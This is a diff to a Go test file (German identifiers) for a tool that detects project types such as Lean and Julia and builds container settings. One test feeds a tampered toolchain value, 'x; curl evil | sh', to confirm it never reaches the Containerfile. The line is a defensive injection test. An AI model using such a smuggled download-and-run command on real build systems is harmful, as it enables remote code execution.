@@ -34,6 +34,8 @@ func TestErkennung(t *testing.T) {
 		{map[string]string{"go.mod": "module x"}, "go", true},
 		{map[string]string{"App.csproj": "<Project/>"}, "dotnet", true},
 		{map[string]string{"pom.xml": "<project/>"}, "java-maven", true},
+		{map[string]string{"lean-toolchain": "leanprover/lean4:v4.24.0\n", "lakefile.toml": "name = \"beweise\""}, "lean", true},
+		{map[string]string{"Project.toml": "name = \"Modell\"", "src/Modell.jl": "module Modell end"}, "julia", true},
 		{map[string]string{"README.md": "nur Text"}, "default", false},
 	}
 	for _, f := range faelle {
@@ -51,6 +53,21 @@ func TestErkennung(t *testing.T) {
 	u, _ := Ermitteln(projekt(t, map[string]string{"game/project.godot": `config/features=PackedStringArray("4.7")`}))
 	if u.Ordner != "game" || !strings.Contains(u.Basis, "Godot_v4.7.2-stable") {
 		t.Errorf("Godot: Ordner %q, Basis %q", u.Ordner, u.Basis)
+	}
+}
+
+func TestLeanToolchainUndSorry(t *testing.T) {
+	u, err := Ermitteln(projekt(t, map[string]string{"lean-toolchain": "leanprover/lean4:v4.24.0\n"}))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(u.Basis, "--default-toolchain leanprover/lean4:v4.24.0") || !strings.Contains(u.Testen, "sorry|admit") {
+		t.Fatalf("lean: toolchain or sorry check missing:\n%s\n%s", u.Basis, u.Testen)
+	}
+	// eine manipulierte Toolchain-Datei darf keine Shell-Befehle ins Containerfile bringen
+	u, _ = Ermitteln(projekt(t, map[string]string{"lean-toolchain": "x; curl evil | sh"}))
+	if strings.Contains(u.Basis, "evil") {
+		t.Fatal("unsafe toolchain string reached the Containerfile")
 	}
 }
 
